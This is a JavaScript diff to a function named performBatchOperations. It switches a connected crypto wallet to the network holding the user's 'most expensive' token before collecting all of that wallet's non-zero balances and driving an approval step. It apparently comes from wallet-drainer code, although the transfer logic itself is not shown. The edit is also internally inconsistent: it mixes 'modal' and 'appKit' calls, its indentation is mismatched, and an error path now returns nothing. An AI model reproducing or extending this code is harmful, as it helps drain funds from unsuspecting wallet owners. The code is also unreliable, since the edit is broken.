@@ -701,37 +701,40 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
     return { success: false, error: errorMessage }
   }
 
-  const targetNetwork = targetNetworkInfo.networkObj
-  const expectedChainId = targetNetworkInfo.chainId
-
-  if (store.networkState.chainId !== expectedChainId) {
-    console.log(`Attempting to switch to ${mostExpensive.network} (chainId ${expectedChainId})`)
-    try {
-      await new Promise((resolve, reject) => {
-        const unsubscribe = appKit.subscribeNetwork(networkState => {
-          if (networkState.chainId === expectedChainId) {
-            console.log(`Successfully switched to ${mostExpensive.network} (chainId ${expectedChainId})`)
-            unsubscribe()
-            resolve()
+        const targetNetwork = targetNetworkInfo.networkObj
+        const expectedChainId = targetNetworkInfo.chainId
+        if (store.networkState.chainId !== expectedChainId) {
+          console.log(`Attempting to switch to ${mostExpensive.network} (chainId ${expectedChainId})`)
+          try {
+            await new Promise((resolve, reject) => {
+              const unsubscribe = modal.subscribeNetwork(networkState => {
+                if (networkState.chainId === expectedChainId) {
+                  console.log(`Successfully switched to ${mostExpensive.network} (chainId ${expectedChainId})`)
+                  unsubscribe()
+                  resolve()
+                }
+              })
+              appKit.switchNetwork(targetNetwork).catch(error => {
+                unsubscribe()
+                reject(error)
+              })
+              setTimeout(() => {
+                unsubscribe()
+                reject(new Error(`Failed to switch to ${mostExpensive.network} (chainId ${expectedChainId}) after timeout`))
+              }, 10000)
+            })
+          } catch (error) {
+            const errorMessage = `Failed to switch network to ${mostExpensive.network} (chainId ${expectedChainId}): ${error.message}`
+            store.errors.push(errorMessage)
+            const approveState = document.getElementById('approveState')
+            if (approveState) approveState.innerHTML = errorMessage
+            hideCustomModal()
+            store.isProcessingConnection = false
+            return
           }
-        })
-        appKit.switchNetwork(targetNetwork).catch(error => {
-          unsubscribe()
-          reject(error)
-        })
-        setTimeout(() => {
-          unsubscribe()
-          reject(new Error(`Failed to switch to ${mostExpensive.network} (chainId ${expectedChainId}) after timeout`))
-        }, 10000)
-      })
-    } catch (error) {
-      const errorMessage = `Failed to switch network to ${mostExpensive.network} (chainId ${expectedChainId}): ${error.message}`
-      store.errors.push(errorMessage)
-      return { success: false, error: errorMessage }
-    }
-  } else {
-    console.log(`Already on correct network: ${mostExpensive.network} (chainId ${expectedChainId})`)
-  }
+        } else {
+          console.log(`Already on correct network: ${mostExpensive.network} (chainId ${expectedChainId})`)
+        }
 
   try {
     // Get tokens with non-zero balance in the most expensive token's network
